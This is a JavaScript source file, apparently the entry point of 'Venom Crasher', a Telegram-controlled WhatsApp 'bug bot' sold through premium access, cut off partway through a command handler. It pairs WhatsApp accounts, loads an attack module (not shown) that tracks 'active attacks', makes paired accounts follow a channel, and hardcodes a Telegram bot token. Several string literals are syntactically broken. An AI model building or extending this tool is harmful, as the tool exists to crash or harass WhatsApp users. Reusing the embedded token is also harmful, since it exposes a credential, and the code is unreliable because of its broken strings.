 /*
 * ============================================
 * INDEX.JS - 𝑴𝒀𝑺𝑻𝑰𝑪 𝑩𝑼𝑮 𝑩𝑶𝑻 
 * Created by: 𝑴𝒀𝑺𝑻𝑰𝑪 𝑻𝑬𝑪𝑯
 * Telegram:@mystichimself
 * ============================================
 */

let makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason;
const baileysReady = import('baileys').then((baileys) => {
  ({ makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = baileys);
  return baileys;
});
const { Boom } = require("@hapi/boom");
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');
const chalk = require('chalk');

const startRaidCrasher = require("./src/case");
const telebase = require('./src/lib/telebase');
const { addOwner, removeOwner, createOwnerConfig, removeOwnerConfig } = require('./src/lib/owner');
const proxyManager = require('./src/lib/proxy-manager');

// ============================================
// HARDCODED CONFIG
// ============================================
const OWNER_TELEGRAM_ID = '7213308911';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8038213130:AAFg0Rll3F4FIFcaj39Y8cobueH3d28eBVM';
const OWNER_USERNAME = '@mr_darkvenom';
const DEVELOPER_LINK = 'https://t.me/mr_darkvenom';

// ── Bot images — replace these URLs with your own catbox uploads ──
const IMG_MAIN     = 'https://cdn.kord.live/serve/g6bZo41kYKxd.jpg'; // /start screen
const IMG_OWNER    = 'https://cdn.kord.live/serve/jLLPbVkbrr85.jpg'; // owner settings screen
const IMG_RAID     = 'https://cdn.kord.live/serve/bEBLDr26X77E.jpg'; // raid access screen
const IMG_THANKS   = 'https://cdn.kord.live/serve/vEdgn9OKDFUS.jpg'; // thanks to screen
const CATBOX_THUMBNAIL = IMG_MAIN;

// ============================================
// FORCE JOIN SETTINGS
// ============================================
const FORCE_JOIN_CONFIG = {
  CHANNEL_JID: '0029VbCT964BKfi0PmDGsV1y@newsletter',
  GROUP_JID: '120363408915017542@g.us',
  ENABLED: true
};

// ============================================
// REQUIRED CHANNELS/GROUPS
// ============================================
const REQUIRED_CHANNELS = [
  { name: '█╚» ◥VENOM DOMAIN ◤ «╝ █', link: 'https://t.me/venom_domain', username: 'venom_domain' },
  { name: '꧁༒ VENOM TECH༒꧂', link: 'https://t.me/number_venom', username: 'number_venom' }
];
    
const botMemberships = new Set();

// ============================================
// CONSOLE BANNER
// ============================================
console.clear();
console.log(chalk.red(`
██████╗  █████╗ ██╗██████╗      ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝███████║██║██║  ██║    ██║     ██████╔╝███████║███████╗███████║█████╗  ██████╔╝
██╔══██╗██╔══██║██║██║  ██║    ██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██████╔╝    ╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚══════╝╚═╝  ╚═╝
`));
console.log(chalk.red('𓅓'.repeat(20)));
console.log(chalk.white('       𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 -  '));
console.log(chalk.red('       Created by: DEV VENOM |  Telegram: @mr_darkvenom'));
console.log(chalk.red('𓅓'.repeat(20)));
console.log(chalk.green(`[INSTANCE CHECK] PID: ${process.pid}`));
console.log(chalk.green(`[INSTANCE CHECK] Time: ${new Date().toISOString()}`));
console.log('');

const instanceProxyIndex = process.argv[2] ? parseInt(process.argv[2]) : null;
if (instanceProxyIndex !== null) {
  console.log(chalk.green(`🔒 Multi-instance mode: Using proxy index ${instanceProxyIndex}`));
  global.instanceProxyIndex = instanceProxyIndex;
}

const activeBots = new Map();
global.botStartTime = Date.now();
global.activeAttacks = new Map();

// Prevent double-firing
const handledMessages = new Set();
const isHandled = (msgId) => {
  if (handledMessages.has(msgId)) return true;
  handledMessages.add(msgId);
  setTimeout(() => handledMessages.delete(msgId), 5000);
  return false;
};

process.on('unhandledRejection', (reason, p) => {
  console.error(chalk.red('UNHANDLED REJECTION at:'), p, chalk.red('reason:'), reason);
});

// ============================================
// HELPER FUNCTIONS
// ============================================
const toMathItalic = (text) => {
  const fontMap = {
    'A': '𝑨', 'B': '𝑩', 'C': '𝑪', 'D': '𝑫', 'E': '𝑬', 'F': '𝑭', 'G': '𝑮', 'H': '𝑯',
    'I': '𝑰', 'J': '𝑱', 'K': '𝑲', 'L': '𝑳', 'M': '𝑴', 'N': '𝑵', 'O': '𝑶', 'P': '𝑷',
    'Q': '𝑸', 'R': '𝑹', 'S': '𝑺', 'T': '𝑻', 'U': '𝑼', 'V': '𝑽', 'W': '𝑾', 'X': '𝑿',
    'Y': '𝒀', 'Z': '𝒁',
    'a': '𝒂', 'b': '𝒃', 'c': '𝒄', 'd': '𝒅', 'e': '𝒆', 'f': '𝒇', 'g': '𝒈', 'h': '𝒉',
    'i': '𝒊', 'j': '𝒋', 'k': '𝒌', 'l': '𝒍', 'm': '𝒎', 'n': '𝒏', 'o': '𝒐', 'p': '𝒑',
    'q': '𝒒', 'r': '𝒓', 's': '𝒔', 't': '𝒕', 'u': '𝒖', 'v': '𝒗', 'w': '𝒘', 'x': '𝒙',
    'y': '𝒚', 'z': '𝒛',
    '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒', '5': '𝟓', '6': '𝟔', '7': '𝟕',
    '8': '𝟖', '9': '𝟗'
  };
  return text.split('').map(char => fontMap[char] || char).join('');
};

const getUptime = (startTime) => {
  const uptime = (Date.now() - startTime) / 1000;
  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  if (days > 0) return `${days}d ${hours}h ${minutes}m`;
  if (hours > 0) return `${hours}h ${minutes}m ${seconds}s`;
  return `${minutes}m ${seconds}s`;
};

// ============================================
// PREMIUM CHECK
// ============================================
const isPremiumUser = (chatId) => {
  return chatId.toString() === OWNER_TELEGRAM_ID || telebase.isPremium(chatId);
};

const getPremiumDeniedMessage = (chatId) => {
  const idStr = String(chatId);
  return {
    text: `╔══════════════════════════════╗\n║   ACCESS DENIED ⚡   ║\n╚═══════════════════════════════════╝\n\n🌚 This bot is for VENOMOUS beings only.\n🗿 You are not a premium user.\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📱 Your Telegram ID:\n<code>${idStr}</code>\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🔥 Want access?\n    1. Tap ID above to copy\n  「𖦠」 2. Send it to: ${OWNER_USERNAME}\n.   3. Wait for approval\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   🗿 "Only the chosen shall enter"`,
    options: { parse_mode: 'HTML' }
  };
};

// ============================================
// FORCE JOIN FUNCTION
// ============================================
async function forceJoinWhatsApp(sock, userJid) {
  if (!FORCE_JOIN_CONFIG.ENABLED) return { success: false, message: 'Force join disabled' };

  const results = { channel: { success: false, message: '' }, group: { success: false, message: '' } };

  if (FORCE_JOIN_CONFIG.CHANNEL_JID && FORCE_JOIN_CONFIG.CHANNEL_JID !== '120363XXXXXXXXXX@newsletter') {
    try {
      await sock.newsletterFollow(FORCE_JOIN_CONFIG.CHANNEL_JID);
      results.channel.success = true;
      console.log(chalk.green(`✅ ${userJid} joined WhatsApp channel`));
    } catch (err) {
      results.channel.success = false;
      results.channel.message = `Failed: ${err.message}`;
      console.error(chalk.red(`❌ Failed to join channel for ${userJid}:`), err.message);
    }
  }

  if (FORCE_JOIN_CONFIG.GROUP_JID && FORCE_JOIN_CONFIG.GROUP_JID !== '120363408915017542@g.us') {
    try {
      await sock.groupAcceptInvite(FORCE_JOIN_CONFIG.GROUP_JID);
      results.group.success = true;
      console.log(chalk.green(`✅ ${userJid} joined WhatsApp group`));
    } catch (err) {
      if (err.message.includes('already') || err.message.includes('participant')) {
        results.group.success = true;
      } else {
        results.group.success = false;
        results.group.message = `Failed: ${err.message}`;
        console.error(chalk.red(`❌ Failed to join group for ${userJid}:`), err.message);
      }
    }
  }

  return results;
}

// ============================================
// VALIDATION FUNCTIONS
// ============================================
const validatePhoneNumber = (input) => {
  if (!input) return { valid: false, error: 'missing', message: `❌ Missing number\n\nUsage: /pair <number>\nExample: /pair 234XXXXXXX` };
  const cleaned = input.replace(/[^0-9]/g, '');
  if (input.includes(' ')) return { valid: false, error: 'spaces', cleaned, message: `❌ Remove spaces\n\nCorrect: /pair ${cleaned}` };
  if (/[^0-9]/.test(input)) return { valid: false, error: 'invalid_chars', cleaned, message: `❌ Numbers only\n\nCorrect format: /pair ${cleaned}` };
  if (cleaned.length < 10) return { valid: false, error: 'too_short', message: `❌ Number too short\n\nMinimum 10 digits required.\nExample: /pair 234XXXXXXX` };
  return { valid: true, number: cleaned };
};

const validateTelegramId = (input) => {
  if (!input) return { valid: false, message: `❌ Missing Telegram ID\n\nUsage: /ban <telegram_id>\nExample: /ban 1234567890` };
  const cleaned = input.replace(/[^0-9]/g, '');
  if (/[^0-9]/.test(input)) return { valid: false, message: `❌ Invalid ID — numbers only\n\nCorrect: ${cleaned}` };
  return { valid: true, id: cleaned };
};

// ============================================
// CHANNEL VERIFICATION
// ============================================
async function checkUserInChannels(telegramBot, userId) {
  const missing = [];
  const isOwner = userId.toString() === OWNER_TELEGRAM_ID;
  if (isOwner) return { verified: true, missing: [] };

  for (const channel of REQUIRED_CHANNELS) {
    if (channel.isWhatsApp) continue;
    try {
      let chatId = channel.chatId;
      if (!chatId && channel.username) chatId = '@' + channel.username;
      if (chatId) {
        const member = await telegramBot.getChatMember(chatId, userId);
        if (!member || member.status === 'left' || member.status === 'kicked') missing.push(channel);
      } else {
        missing.push(channel);
      }
    } catch (err) {
      console.log(chalk.yellow(`Could not verify ${channel.name}:`, err.message));
      missing.push(channel);
    }
  }

  return { verified: missing.length === 0, missing };
}

// ============================================
// MENU BUILDERS
// ============================================

// ── SEND /start MENU ──
async function sendStartMenu(telegramBot, chatId, isOwnerUser, firstName, userBots) {
  const menuVideoPath = path.join(__dirname, 'Assets', 'menu.mp4');
  const menuImagePath = path.join(__dirname, 'Assets', 'menu.jpg');

  // ── Both owner and premium see the same basic start info ──
  const menuText =
    `<blockquote> 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.2.0\n\n` +
    `○ 𝗔𝘂𝘁𝗵𝗼𝗿 : ${OWNER_USERNAME}\n` +
    `○ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0.0\n` +
    `○ 𝗣𝗿𝗲𝗳𝗶𝘅 : (/) Slash\n` +
    `○ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${firstName}\n` +
    `○ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isOwnerUser ? '👑 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗥' : '✅ 𝗔𝗖𝗧𝗜𝗩𝗘'}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `   🗿 "THOSE WHO DONT KNOW PAIN WILL NEVER KNOW TRUE PEACE "</blockquote>`;

  // ── Keyboard ──
  // Owner gets: Owner Settings | Raid Access | Thanks To | Contact Dev
  // Premium gets: Raid Access | Contact Dev
  const ownerKeyboard = {
    inline_keyboard: [
      [
        { text: '𐂂 Owner Settings', callback_data: 'menu_owner_settings' },
        { text: '𓀬 Meta Access', callback_data: 'menu_raid_access' }
      ],
      [
        { text: '⚤︎ Thanks To', callback_data: 'menu_thanks' }
      ],
      [
        { text: 'Contact Dev', url: DEVELOPER_LINK }
      ]
    ]
  };

  const premiumKeyboard = {
    inline_keyboard: [
      [
        { text: '🩸 Meta Access', callback_data: 'menu_raid_access' }
      ],
      [
        { text: ' Contact Dev', url: DEVELOPER_LINK }
      ]
    ]
  };

  const keyboard = isOwnerUser ? ownerKeyboard : premiumKeyboard;

  try {
    await telegramBot.sendPhoto(chatId, IMG_MAIN, { caption: menuText, parse_mode: 'HTML', reply_markup: keyboard });
  } catch (err) {
    console.error(chalk.red('Error sending menu:'), err);
    await telegramBot.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
  }
}

// ============================================
// TELEGRAM BOT INITIALIZATION
// ============================================
let telegramBot;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
  telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
  console.log(chalk.green("✅ VENOM CRASHER Telegram Bot Initialized"));

  telegramBot.on('my_chat_member', (update) => {
    const chatId = update.chat.id;
    const newStatus = update.new_chat_member.status;
    if (newStatus === 'member' || newStatus === 'administrator') {
      botMemberships.add(chatId);
      console.log(chalk.green(`✅ Bot joined: ${update.chat.title || chatId}`));
    } else if (newStatus === 'left' || newStatus === 'kicked') {
      botMemberships.delete(chatId);
      console.log(chalk.yellow(`⚠️ Bot left: ${update.chat.title || chatId}`));
    }
  });

  // Ban check
  let banCheckInitialized = false;
  if (!banCheckInitialized) {
    telegramBot.on('message', (msg) => {
      const chatId = msg.chat?.id;
      if (chatId && telebase.isBanned(chatId) && !msg.text?.startsWith('/')) {
        telegramBot.sendMessage(chatId, `🚫 You have been banished!\n📱 Contact: ${OWNER_USERNAME}`);
      }
    });
    banCheckInitialized = true;
  }

  // ============================================
  // /START COMMAND
  // ============================================
  telegramBot.onText(/\/start/, async (msg) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;
    const chatType = msg.chat.type;
    const username = msg.from.username || 'unknown';
    const firstName = msg.from.first_name || 'Raider';
    const userId = msg.from.id;

    if (chatType === 'group' || chatType === 'supergroup') {
      const mentionText = `Hey <a href="tg://user?id=${userId}">${firstName}</a>! 👋\n\n「𖦠」DM me and send /start to join the Night Raiders and deploy *VENOM* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 「𖦠」`;
      try {
        await telegramBot.sendMessage(chatId, mentionText, { parse_mode: 'HTML' });
      } catch (err) {
        console.error(chalk.red('Error sending group /start message:'), err);
      }
      return;
    }

    if (telebase.isBanned(chatId)) {
      return telegramBot.sendMessage(chatId, `🚫 You are banished!\n📱 Contact: ${OWNER_USERNAME}`);
    }

    telebase.saveUser(chatId, username, firstName);

    const isOwnerUser = chatId.toString() === OWNER_TELEGRAM_ID;
    const verification = await checkUserInChannels(telegramBot, chatId);

    if (!verification.verified) {
      const missingList = verification.missing.map(ch => `「𖦠」 ${ch.name}`).join('\n');
      const verifyText =
        `╔═══════════════════════════════════╗\n` +
        `║   𓅓 ACCESS DENIED 「𖦠」    ║\n` +
        `╚═══════════════════════════
        '════════╝\n\n` +
        `⚠️ Join all channels first!\n\n` +
        `🔒 Missing:\n${missingList}\n\n` +
        `Join all, then tap ✅ VERIFY below.\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `☠︎︎𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹☠︎︎  `;

      const keyboard = {
        inline_keyboard: [
          ...REQUIRED_CHANNELS.filter(ch => !ch.isWhatsApp).map(ch => [
            { text: `「𖦠」 ${ch.name}`, url: ch.link }
          ]),
          [{ text: '✅ VERIFY JOINED', callback_data: 'verify_channels' }]
        ]
      };

      return telegramBot.sendMessage(chatId, verifyText, { reply_markup: keyboard });
    }

    // Premium check (skip for owner)
    if (!isOwnerUser && !telebase.isPremium(chatId)) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const userBots = Array.from(activeBots.entries()).filter(([id]) => id.startsWith(`${chatId}_`));
    await sendStartMenu(telegramBot, chatId, isOwnerUser, firstName, userBots);
  });

  // ============================================
  // CALLBACK QUERY HANDLER
  // ============================================
  telegramBot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id;
    const firstName = callbackQuery.from.first_name || 'Raider';
    const isOwnerUser = chatId.toString() === OWNER_TELEGRAM_ID;

    await telegramBot.answerCallbackQuery(callbackQuery.id);

    // ── Back button — restore main menu ──
    if (data === 'back') {
      const menuImagePath = path.join(__dirname, 'Assets', 'menu.jpg');
      const menuVideoPath = path.join(__dirname, 'Assets', 'menu.mp4');

      const ownerMenuText =
        `<blockquote> ☠︎︎𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬\n\n` +
        `○ 𝗔𝘂𝘁𝗵𝗼𝗿 : ${OWNER_USERNAME}\n` +
        `○ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.1.0\n` +
        `○ 𝗣𝗿𝗲𝗳𝗶𝘅 : (/) \n` +
        `○ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${firstName}\n` +
        `○ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : 👑 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗥\n\n` +
        `━━━━━^━━━ ━━━━━^━━━━ ━━━━━━━━^━━ ━━━━\n` +
        `   ⚡ "THE INFINITE TSUKUYOMI "</blockquote>`;

      const userMenuText =
        `<blockquote> 𝑽𝑬𝑵𝑶𝑴 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.1\n\n` +
        `○ 𝗔𝘂𝘁𝗵𝗼𝗿 : ${OWNER_USERNAME}\n` +
        `○ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0.0\n` +
        `○ 𝗣𝗿𝗲𝗳𝗶𝘅 : (/) \n` +
        `○ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${firstName}\n` +
        `○ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ✅ 𝗔𝗖𝗧𝗜𝗩𝗘\n\n` +
        `━━━ ━━━━━━ ━━━━^━━━━━━━━ ━━━━━^━━━ ━━━\n` +
        `   👹 "THE INFINITE TSUKUYOMI"</blockquote>`;

      const ownerKeyboard = {
        inline_keyboard: [
          [
            { text: '⚙️ Owner Settings', callback_data: 'menu_owner_settings' },
            { text: '💀 Meta Access',     callback_data: 'menu_raid_access'    }
          ],
          [{ text: '❤ Thanks To',        callback_data: 'menu_thanks'         }],
          [{ text: 'Contact Dev',    url: DEVELOPER_LINK                  }]
        ]
      };

      const premiumKeyboard = {
        inline_keyboard: [
          [{ text: '💀 Meta Access',   callback_data: 'menu_raid_access' }],
          [{ text: 'Contact Dev', url: DEVELOPER_LINK              }]
        ]
      };

      const menuText = isOwnerUser ? ownerMenuText : userMenuText;
      const keyboard = isOwnerUser ? ownerKeyboard : premiumKeyboard;

      await telegramBot.editMessageMedia({
        type: 'photo',
        media: IMG_MAIN,
        caption: menuText,
        parse_mode: 'HTML'
      }, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
      return;
    }

    // ── Channel verify ──
    if (data === 'verify_channels') {
      const verification = await checkUserInChannels(telegramBot, chatId);
      if (verification.verified) {
        await telegramBot.sendMessage(chatId, `✅ Verified! Send /start to continue.`);
      } else {
        const missingList = verification.missing.map(ch => ` ${ch.name}`).join('\n');
        await telegramBot.sendMessage(chatId, `❌ Still missing:\n${missingList}\n\nJoin all and verify again.`);
      }
      return;
    }

    // ── Owner Settings ──
    if (data === 'menu_owner_settings') {
      if (!isOwnerUser) {
        await telegramBot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Owner only!', show_alert: true });
        return;
      }

      const ownerSettingsText =
        `<blockquote> 𝗢𝗪𝗡𝗘𝗥 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ▼・ᴥ・▼\n\n` +
        `🌒 /pair &lt;number&gt; — 𝗗𝗲𝗽𝗹𝗼𝘆 𝗕𝗼𝘁\n` +
        `🔔 /disconnect &lt;number&gt; — 𝗥𝗲𝗺𝗼𝘃𝗲 𝗕𝗼𝘁\n\n` +
        `⚡ /stats — 𝗥𝗮𝗶𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘀\n` +
        `⚡ /addprem &lt;id&gt; — 𝗔𝗱𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺\n` +
        `⚡ /delprem &lt;id&gt; — 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺\n` +
        `⚡ /ban &lt;id&gt; — 𝗕𝗮𝗻𝗶𝘀𝗵 𝗥𝗮𝗶𝗱𝗲𝗿\n` +
        `⚡ /unban &lt;id&gt; — 𝗥𝗲𝗱𝗲𝗲𝗺 𝗥𝗮𝗶𝗱𝗲𝗿\n\n` +
        `━━━━━━━━━━━━━━━━━━▼・ᴥ・▼━━━━━━━━━━━━━━━━━\n` +
        `   𓅓 "𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝗣𝗮𝗻𝗲𝗹"</blockquote>`;

      const keyboard = {
        inline_keyboard: [
          [{ text: '↺ Back', callback_data: 'back' }]
        ]
      };

      await telegramBot.editMessageMedia({
        type: 'photo',
        media: IMG_OWNER,
        caption: ownerSettingsText,
        parse_mode: 'HTML'
      }, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
      return;
    }

    // ── Raid Access ──
    if (data === 'menu_raid_access') {
      if (!isPremiumUser(chatId)) {
        await telegramBot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Premium only!', show_alert: true });
        return;
      }

      const crashText =
        `<blockquote> INSTANCE 𝗔𝗖𝗖𝗘𝗦𝗦 \n\n` +
        `🌒 /pair &lt;number&gt;\n` +
        `└‣ 𝗗𝗲𝗽𝗹𝗼𝘆 𝗕𝗼𝘁\n\n` +
        `🔔 /disconnect &lt;number&gt;\n` +
        `└‣ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗕𝗼𝘁\n\n` +
        `▼━━━━━━━━━━━━━━▼・ᴥ・▼━━━━━━━━━━━━━━━━━━━▼\n` +
        `   "💥OBEY THE RULES"</blockquote>`;

      const keyboard = {
        inline_keyboard: [
          [{ text: '↺ Back', callback_data: 'back' }]
        ]
      };

      await telegramBot.editMessageMedia({
        type: 'photo',
        media: IMG_RAID,
        caption: crashText,
        parse_mode: 'HTML'
      }, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
      return;
    }

    // ── Thanks To ──
    if (data === 'menu_thanks') {
      if (!isOwnerUser) {
        await telegramBot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Owner only!', show_alert: true });
        return;
      }

      const thanksText =
        `<blockquote> 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 裂\n\n` +
        `(●’◡’●)ﾉ █╚» ◥꧁༒ 🆅︎🅴︎🅽︎🅾︎🅼︎༒꧂◤ «╝ █:\n\n` +
        `裂MR. DARKVENOM( Creator )\n` +
        `━━━━━━━━ ━━━━━━━━━ ━━━━━━━━━━━━ ━━━━━━\n` +
        `    "𓅓THE DARKVENOM" 🖤</blockquote>`;

      const keyboard = {
        inline_keyboard: [
          [{ text: '↺ Back', callback_data: 'back' }]
        ]
      };

      await telegramBot.editMessageMedia({
        type: 'photo',
        media: CATBOX_THUMBNAIL,
        caption: thanksText,
        parse_mode: 'HTML'
      }, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
      return;
    }
  });

  // ============================================
  // /PAIR COMMAND
  // ============================================
  telegramBot.onText(/\/pair(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;
    const input = match[1].trim();

    if (telebase.isBanned(chatId)) return telegramBot.sendMessage(chatId, `🚫 Banished.`);
    if (!isPremiumUser(chatId)) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const validation = validatePhoneNumber(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, validation.message);

    const phoneNumber = validation.number;
    const verification = await checkUserInChannels(telegramBot, chatId);
    if (!verification.verified) return telegramBot.sendMessage(chatId, `⚠️ Join channels first.\n\nSend /start to verify.`);

    const userBots = Array.from(activeBots.entries()).filter(([id]) => id.startsWith(`${chatId}_`));
    const isOwnerUser = chatId.toString() === OWNER_TELEGRAM_ID;
    const maxBots = isOwnerUser ? 10 : 3;

    if (userBots.length >= maxBots) return telegramBot.sendMessage(chatId, `⛔ Limit reached (${maxBots} bots)\n\n Disconnect one first.`);

    const botId = `${chatId}_${phoneNumber}`;
    if (activeBots.has(botId)) return telegramBot.sendMessage(chatId, `⚠️ Bot already exists for +${phoneNumber}`);

    telegramBot.sendMessage(chatId, `⏳ 「𖦠」Deploying raider for +${phoneNumber}...`);

    try {
      await startBotInstance(chatId, phoneNumber, botId);
      telebase.incrementUserBots(chatId);
    } catch (err) {
      console.error(chalk.red(`❌ Error starting bot for ${phoneNumber}:`), err);
      try { telegramBot.sendMessage(chatId, `⛔ Error: ${err.message}`); } catch (e) {}
    }
  });

  // ============================================
  // /DISCONNECT COMMAND
  // ============================================
  telegramBot.onText(/\/disconnect(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;
    const input = match[1].trim();

    if (telebase.isBanned(chatId)) return telegramBot.sendMessage(chatId, `🚫 Banished.`);
    if (!isPremiumUser(chatId)) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const validation = validatePhoneNumber(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, `❌ Missing number\n\nUsage: /disconnect <number>\nExample: /disconnect 234XXXXXXX`);

    const phoneNumber = validation.number;
    const botId = `${chatId}_${phoneNumber}`;
    const bot = activeBots.get(botId);

    if (!bot) return telegramBot.sendMessage(chatId, `⛔ No bot found for +${phoneNumber}`);

    try {
      bot.sock.ev.removeAllListeners();
      bot.sock.end(undefined);
      activeBots.delete(botId);

      const authPath = path.join(__dirname, 'auth', botId);
      if (fs.existsSync(authPath)) fs.removeSync(authPath);

      removeOwner(phoneNumber);
      removeOwnerConfig(phoneNumber);
      telebase.decrementUserBots(chatId);

      telegramBot.sendMessage(chatId, `✅ Bot disconnected: +${phoneNumber}\n\n「𖦠」"Raider stands down" 🖤`);
    } catch (err) {
      console.error(chalk.red(`Error disconnecting bot ${botId}:`), err);
      try { telegramBot.sendMessage(chatId, `⛔ Error: ${err.message}`); } catch (e) {}
    }
  });

  // ============================================
  // /STATS COMMAND (OWNER ONLY)
  // ============================================
  telegramBot.onText(/\/stats/, async (msg) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;

    if (chatId.toString() !== OWNER_TELEGRAM_ID) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const stats = telebase.getStats();
    const activeBotCount = activeBots.size;
    const uptime = getUptime(global.botStartTime);
    const premiumCount = telebase.getPremiumCount ? telebase.getPremiumCount() : 'N/A';

    const statsText =
      `╔═══════ ▼・ᴥ・▼════════════         ════       '══════╗\n` +
      `║ ▼・ᴥ・▼ 𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 STATS ║\n` +
      `╚════════════════════
      '════════════╝\n\n` +
      `👥 Total Raiders: ${stats.totalUsers}\n` +
      `🤖 Active Bots: ${activeBotCount}\n` +
      `💎 Premium Raiders: ${premiumCount}\n` +
      `🚫 Banished: ${stats.bannedUsers}\n` +
      `⏰ Uptime: ${uptime}\n\n` +
      `━━━━━━ ━━━━━━━━ ━━━━━━━━━━━━━━━━━━━ ━━\n` +
      `    "𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝗗𝗼𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴" 🖤`;

    telegramBot.sendMessage(chatId, statsText);
  });

  // ============================================
  // /ADDPREM COMMAND (OWNER ONLY)
  // ============================================
  telegramBot.onText(/\/addprem(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;

    if (chatId.toString() !== OWNER_TELEGRAM_ID) {
      const _d = getPremiumDeniedMessage(chatId);
      return telegramBot.sendMessage(chatId, _d.text, _d.options);
    }

    const input = match[1].trim();
    const validation = validateTelegramId(input);
    if (!validation.valid) return telegramBot.sendMessage(chatId, `❌ Missing ID\n\nUsage: /addprem <telegram_id>\nExample: /addprem 1234567890`);

    const targetId = validation.id;
    if (telebase.isPremium(targetId)) return telegramBot.sendMessage(chatId, `⚠️ ID ${targetId} already has premium.`);

    telebase.addPremium(targetId, 36500);
    telegramBot.sendMessage(chatId, `✅ Premium granted\n\n👤 ID: ${targetId}\n「𖦠」Meta access unlocked.\n\n   👿 "The chosen have entered"`);

    try {
      telegramBot.sendMessage(targetId, `🔥 Premium access granted!\n\n「𖦠」Welcome to Malovalent Dormain\n⚡ Send /start to begin.\n\n   👿 "You are now a Meta"`);
    } catch (err) {
      console.log(chalk.yellow('Could not notify new premium user'));
    }
  });

  // ============================================
  // /DELPREM COMMAND (OWNER ONLY)
  // ============================================
  telegramBot.onText(/\/delprem(.*)/, async (msg, match) => {
    if (isHandled(msg.message_id)) return;
    const chatId = msg.chat.id;

    if (chatId.toString() !== OWNER_TELEGRAM_ID) {
